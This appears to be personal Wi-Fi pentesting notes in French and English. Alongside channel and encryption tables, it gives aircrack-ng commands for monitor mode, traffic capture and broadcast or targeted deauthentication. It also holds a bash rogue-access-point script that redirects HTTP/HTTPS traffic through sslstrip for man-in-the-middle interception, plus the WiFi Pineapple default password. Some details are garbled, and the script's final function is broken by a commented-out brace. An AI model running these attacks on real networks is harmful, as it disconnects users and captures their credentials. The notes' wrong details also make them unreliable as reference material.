# Wifi basics

## definitions

*AP* = Access Point
*ESSID* = (Extended Service Set Identifier)
*BSSID* = (Basic Service Set Identifier)
*SSID* = (Service Set Identifier)
*Channels* = Can operate from 1 to 14, and in the US from 1 to 11.
*Power* = How far you are from the signal
*Security* = WEP, WPA1, WPA2, WPA3
*Modes* = Managed, Master, Master
*Frequency* = 2.4GHHz or 5GHz

## Modulation

ASK, FSK, PSK
OFDM : Orthogonal Frequency Division Multiplexing
DSSS : Direct-Sequence Spread Spectrum
FHSS : Frequency Hopping Spread Spectrum

## Cryptographie

| Normes | Authent | Algorithmes | IV (bits) | Clé (bits) |
|-------|------|-------------|--|--|
| WEP (obsolète) || RC4 | 24 | 40..104 |
| WPA  (obsolète)| RC4 TKIP | 48 | 128 |
| WPA2 | PSK | AES-CCMP | 48 | 128 |
| WPA2 entreprise | 802.1X/EAP | AES CCMP |||
| WPA3 | SAE+FS/PFS | AES-CCMP/AES-GCMP | 48 | 128..256 |
| WPA3 entreprise | 802.1X/EAP | GCMP | AES |||

## Canaux

| Freq | nb | pas |
|------|--------------|-----|
| 2.4 GHz | 13 (14 au Japon) | 5 MHz |
| 5 GHz | 22 | 20 MHz |

### valeurs

2.4 GHz:

| id | Freq (GHz) |
|----|------|
| 1 | 2.412 |
| 2 | 2.417 |
| 3 | 2.422 |
| 4 | 2.427 |
| 5 | 2.432 |
| 6 | 2.437 |
| 7 | 2.442 |
| 8 | 2.447 |
| 9 | 2.452 |
| 10 | 2.457 |
| 11 | 2.462 |
| 12 | 2.467 |
| 13 | 2.472 |
| 14 | 2.484 |

5.GHz :

| Canal | Freq (GHz) |
|-------|-----------------|
| 32    | 5.160           | 
| 36    | 5.180           | 
| 40    | 5.200           | 
| 44    | 5.220           | 
| 48    | 5.240           | 
| 52    | 5.260           | 
| 56    | 5.280           | 
| 60    | 5.300           | 
| 64    | 5.320           | 
| 68    | 5.340           |
| 96    | 5.480           |
|100    | 5.500           | 
|104    | 5.520           | 
|108    | 5.540           | 
|112    | 5.560           | 
|116    | 5.580           | 
|120    | 5.600           | 
|124    | 5.620           | 
|128    | 5.640           | 
|132    | 5.660           | 
|136    | 5.680           | 
|140    | 5.700           | 

6GHz : interdit en France

## enumeration sommaire windows

```Batch
netsh wlan show networks
```

## PINEAPPLE MARK VII

[produit](https://shop.hak5.org/products/wifi-pineapple)

une fois branché: http://172.16.42.1:1471/#/Login

default passwd: hak5pineapple

### Principales attaques

* Deauth
* Rogue AP / Evil Twin (Clone)
* Captures Handshakes
* MITM

### Campagnes

Possibilités de faire des campagnes de différents types pour tester le niveau de sécurité

### Evil Twin

possibilité de faire:

* un bruteforce des half handshake capturé
* un portail captif pour récuperer les mots de passess


## Hidden AP

Le mode *monitor* permet de sniffer plus que les beacons et de détecter les wifi "cachés".

On peut aussi les débecter par analyse de spectre et antenne directionnelle pour trouver la source d'émission.

### aicrack-ng 

Enabling monitor mode, **la carte wifi doit etre compatible!**

Before capturing any traffic, it is necessary to enable the monitoring mode on the 802.11 interface wlan0.

This is typically done using iwconfig

```sh
iface = wlan0
sudo ifconfig $iface down
sudo iwconfig $iface mode monitor
sudo ifconfig $iface up
```

Where wlan0 is the name of your wireless interface supporting the monitor mode. From this point,
the interface wlan0 is in monitor mode and ready to capture and inject traffic.
If you are encountering errors or a strange behavior with your monitoring interface, you can try
"unblocking" the interface with the following commands:

```sh
nmcli nm wifi off
sudo rfkill unblock all
```

### capture quick and dirty

`airodump-ng wlan0mon`


### capture dans un fichier :

```sh
airodump-ng --essid <nom AP> -c <channel> -w capture-file wlan1
airodump-ng --bssid <mac AP> -c <channel> -w capture-file wlan1
```

### deauth (broadcast):

```sh
sudo aireplay-ng --deauth 30 -a <mac AP> wlan1
```

### deauth ciblée:

```sh
sudo aireplay-ng --deauth 30 -a <mac AP> -c <mac Client> wlan1
```

## autres outils

* Acrylic Wifi
* Kismet
* WiFi Analyzer (Windows Store)

## Script pour un rogue access point

```sh
function AP1 {

	#creation d'un Access Point
	echo -e "/!\ KALI MUST BE SET IN AIRPLANE MODE/WIFI DISABLED BEFORE.\nthe nat configuration of iptables is not flush for do that: iptables -t nat -D PREROUTING 1 "
	echo -e "syntax: AP1 <bssid/mac> <essid/APname> <canal> <iface>"
	ifconfig $4 down
	iwconfig $4 mode monitor
	rfkill unblock wlan
	airbase-ng -a $1 -c $3 --essid $2 $4 
}
export -f AP1

function AP2 {

	#creation d'un access point + acces internet
	echo -e "syntax: AP2 <bssid/mac> <essid/APname> <canal> <Wifi-Iface> <redirection-iface>"
	#creation de l'ap en arriere plan:
	AP1 $1 $2 $3 $4 &
	echo "please wait 10..."
	sleep 10
	#flush d'iptable et redirection de port:
	iptables -F && iptables -X
	iptables -P FORWARD ACCEPT
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT
	iptables -t nat -A POSTROUTING -o $5 -j MASQUERADE
	#kernel fowarding
	echo 1 > /proc/sys/net/ipv4/ip_forward
	
	#configuration du rogue AP: puissance, ip, routage DHCP
	iwconfig wlan0 txpower 30
	ifconfig at0 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
	
	echo -e "default-lease-time 600;\nmax-lease-time 7200;\nsubnet 10.0.0.0 netmask 255.255.255.0 {\nrange 10.0.0.10 10.0.0.15;\noption subnet-mask 255.255.255.0;\noption broadcast-address 10.0.0.255;\noption routers 10.0.0.1;\noption domain-name-servers 8.8.8.8;\noption domain-name \"local\";\n}" > /etc/dhcp/dhcpd.conf

	echo -e "INTERFACESv4=\"at0\"\nINTERFACESv6=\"\"" > /etc/default/isc-dhcp-server 
	service isc-dhcp-server restart
	echo "Enjoy!"
}
export -f AP2

function AP3 {

        #creation d'un access point + acces internet + proxy
        echo -e "syntax: AP3 <bssid/mac> <essid/APname> <canal> <Wifi-Iface> <redirection-iface>"
        #creation de l'ap en arriere plan:
        AP1 $1 $2 $3 $4 &
	echo "lease wait 10..."
        sleep 10
        #flush d'iptable et redirection de port:
        iptables -F && iptables -X
        iptables -P FORWARD ACCEPT
        iptables -P INPUT ACCEPT
        iptables -P OUTPUT ACCEPT
        iptables -t nat -A POSTROUTING -o $5 -j MASQUERADE
        #kernel fowarding
        echo 1 > /proc/sys/net/ipv4/ip_forward

        #configuration du rogue AP: puissance, ip, routage DHCP
        iwconfig wlan0 txpower 30
        ifconfig at0 10.0.0.1 netmask 255.255.255.0
        route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

        echo -e "default-lease-time 600;\nmax-lease-time 7200;\nsubnet 10.0.0.0 netmask 255.255.255.0 {\nrange 10.0.0.10 10.0.0.15;\noption subnet-mask 255.255.255.0;\noption broadcast-address 10.0.0.255;\noption routers 10.0.0.1;\noption domain-name-servers 8.8.8.8;\noption domain-name \"local\";\n}" > /etc/dhcp/dhcpd.conf

        echo -e "INTERFACESv4=\"at0\"\nINTERFACESv6=\"\"" > /etc/default/isc-dhcp-server
        service isc-dhcp-server restart
	
	#mise en place du prooxy:
        iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
        iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
        #Attaque par desauthentification:
        #aireplay-ng -0 15 -a $1 $4
        #sslstrip standard:
        #sslstrip -l 10000 -w ./sslstrip_log    
        #sslstrip2/Leonardo
        /root/Documents/Projets/RogueAP/sslstrip2-master/sslstrip.py -l 10000 -w ./leonardo.log
# }
export -f AP3

function ap { AP2 00:01:C7:4E:15:0D $1 6 $2 $3 ; }
export -f ap
function rogue { AP3 00:01:C7:4E:15:0D $1 6 $2 $3 ; } 
export -f rogue
```
